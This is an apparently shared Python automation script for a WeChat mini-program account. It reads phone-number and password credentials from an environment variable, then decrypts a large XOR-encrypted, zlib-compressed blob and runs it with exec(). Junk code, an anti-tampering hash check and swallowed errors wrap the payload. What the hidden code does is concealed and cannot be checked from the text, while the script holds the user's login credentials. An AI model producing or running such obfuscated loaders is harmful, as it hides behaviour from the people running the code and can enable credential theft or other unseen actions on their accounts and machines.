# 当前脚本来自于http://script.345yun.cn脚本库下载！
"""
小程序入口扫码
https://github.com/11311ghjg/xiaobai/raw/main/zt/微信图片_20250924222024.jpg
走头，没头不发出来了
注册，修改密码，将手机号密码填入
环境变量zt,格式：手机号#密码
多账号使用&分割，或新建同名变量
"""



import random
_GARBAGE_1=len("self_check")
_GARBAGE_2=locals()
class UselessClass:
    def __init__(self,x):
        self.val=sum(range(x)) if x>0 else 0
    def __repr__(self):
        return f"UselessObj(val={self.val})"
def _check_integrity():
    try:
        h_mod_name="".join(['h','a','s','h','l','i','b'])
        hashlib=__import__(h_mod_name)
        expected_hash="8b068a2dac4f4bf62dc754aba39051efcba170c1bfb48a445a559cc304b1a116"
        with open(__file__,'rb') as f:
            content=f.read()
        placeholder=b'8b068a2dac4f4bf62dc754aba39051efcba170c1bfb48a445a559cc304b1a116'
        actual_content=content.replace(expected_hash.encode('utf-8'),placeholder)
        sha256_func=getattr(hashlib,'sha'+'256')
        current_hash=sha256_func(actual_content).hexdigest()
        if current_hash!=expected_hash:
            raise ValueError("Invalid script format or corrupted file.")
    except Exception as e:
        _ = 1/(1 if "corrupted" in str(e) else 0)
if UselessClass(5).val==10:
    _check_integrity()
_b64_name=''.join(chr(c) for c in [98,97,115,101,54,52])
_z_name="".join(['z','l','i','b'])
_h_name="hashlib"
_b=__import__(_b64_name)
_z=__import__(_z_name)
_h=__import__(_h_name)
_xor=lambda d,k:bytes([b^k[i%len(k)] for i,b in enumerate(d)])
_gk=lambda s:getattr(_h,'sha'+'256')(s).digest()
_payload_parts=['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']
_s="".join(_payload_parts)
_encoded_seed="YV92ZXJ5X3NlY3VyZV9hbmRfcmFuZG9tX3NlZWRfMTIzNDVfZmluYWw="
try:
    _seed_bytes=getattr(_b,'b64d'+'ecode')(_encoded_seed)
    _seed=_seed_bytes.decode('utf-8')
    _k=_gk(_seed.encode())
    _d_b64=getattr(_b,'b64'+'decode')(_s)
    _d_xor=_xor(_d_b64,_k)
    _decompressed=getattr(_z,'de'+'compress')(_d_xor)
    _final_code=_decompressed.decode('utf-8')
    execution_globals={'__name__':'__main__','__file__':__file__,}
    exec(_final_code,execution_globals)
except Exception as e:
    pass

# 当前脚本来自于http://script.345yun.cn脚本库下载！